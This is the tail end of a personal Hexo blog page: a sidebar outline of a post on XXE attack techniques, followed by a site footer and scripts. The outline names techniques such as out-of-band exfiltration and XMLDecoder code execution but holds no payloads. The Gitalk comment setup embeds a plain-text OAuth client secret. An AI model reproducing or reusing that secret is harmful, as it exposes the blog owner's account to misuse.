class="nav-text">Billion Laugh Attack</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Yaml-Attack"><span class="nav-number">1.2.13.2.</span> <span class="nav-text">Yaml Attack</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E7%88%86%E7%82%B8%E6%94%BB%E5%87%BB"><span class="nav-number">1.2.13.3.</span> <span class="nav-text">二次爆炸攻击</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hidden-XXE-Surfaces"><span class="nav-number">1.3.</span> <span class="nav-text">Hidden XXE Surfaces</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XInclude"><span class="nav-number">1.3.1.</span> <span class="nav-text">XInclude</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SVG-File-Upload"><span class="nav-number">1.3.2.</span> <span class="nav-text">SVG - File Upload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PDF-File-upload"><span class="nav-number">1.3.3.</span> <span class="nav-text">PDF - File upload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Content-Type-From-x-www-urlencoded-to-XML"><span class="nav-number">1.3.4.</span> <span class="nav-text">Content-Type: From x-www-urlencoded to XML</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Content-Type-From-JSON-to-XEE"><span class="nav-number">1.3.5.</span> <span class="nav-text">Content-Type: From JSON to XEE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WAF-amp-Protections-Bypasses"><span class="nav-number">1.4.</span> <span class="nav-text">WAF &amp; Protections Bypasses</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Base64"><span class="nav-number">1.4.1.</span> <span class="nav-text">Base64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UTF-7"><span class="nav-number">1.4.2.</span> <span class="nav-text">UTF-7</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#File-x2F-Protocol-Bypass"><span class="nav-number">1.4.3.</span> <span class="nav-text">File:&#x2F; Protocol Bypass</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTML-Entities"><span class="nav-number">1.4.4.</span> <span class="nav-text">HTML Entities</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP-Wrappers"><span class="nav-number">1.5.</span> <span class="nav-text">PHP Wrappers</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Base64-1"><span class="nav-number">1.5.1.</span> <span class="nav-text">Base64</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Extract-external-resource"><span class="nav-number">1.5.1.1.</span> <span class="nav-text">Extract external resource</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Remote-code-execution"><span class="nav-number">1.5.2.</span> <span class="nav-text">Remote code execution</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SOAP-XEE"><span class="nav-number">1.6.</span> <span class="nav-text">SOAP - XEE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XLIFF-XXE"><span class="nav-number">1.7.</span> <span class="nav-text">XLIFF - XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Blind-request"><span class="nav-number">1.7.1.</span> <span class="nav-text">Blind request</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exfiltrating-Data-via-Out-of-Band"><span class="nav-number">1.7.2.</span> <span class="nav-text">Exfiltrating Data via Out of Band</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exfiltrating-Data-via-Error-Based"><span class="nav-number">1.7.3.</span> <span class="nav-text">Exfiltrating Data via Error Based</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RSS-XEE"><span class="nav-number">1.8.</span> <span class="nav-text">RSS - XEE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Ping-back"><span class="nav-number">1.8.1.</span> <span class="nav-text">Ping back</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Read-file"><span class="nav-number">1.8.2.</span> <span class="nav-text">Read file</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Read-source-code"><span class="nav-number">1.8.3.</span> <span class="nav-text">Read source code</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Java-XMLDecoder-XEE-to-RCE"><span class="nav-number">1.9.</span> <span class="nav-text">Java XMLDecoder XEE to RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Using-Runtime-exec"><span class="nav-number">1.9.1.</span> <span class="nav-text">Using Runtime().exec()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ProcessBuilder"><span class="nav-number">1.9.2.</span> <span class="nav-text">ProcessBuilder</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tools"><span class="nav-number">1.10.</span> <span class="nav-text">Tools</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#More-resources"><span class="nav-number">1.11.</span> <span class="nav-text">More resources</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">sing</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives">
          <span class="site-state-item-count">25</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
        <span class="site-state-item-count">37</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">sing</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">

<script>
NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
    var gitalk = new Gitalk({
      clientID    : '6e8bfc081de57f042466',
      clientSecret: '9b93268b65af7c8c4e8af7a5a1a539f01671b723',
      repo        : 'sing3r.github.io',
      owner       : 'sing3r',
      admin       : ['sing3r'],
      id          : 'c109424f2a7bbd344326159f2bcb58d2',
        language: '',
      distractionFreeMode: true
    });
    gitalk.render('gitalk-container');
  }, window.Gitalk);
});
</script>

</body>
</html>
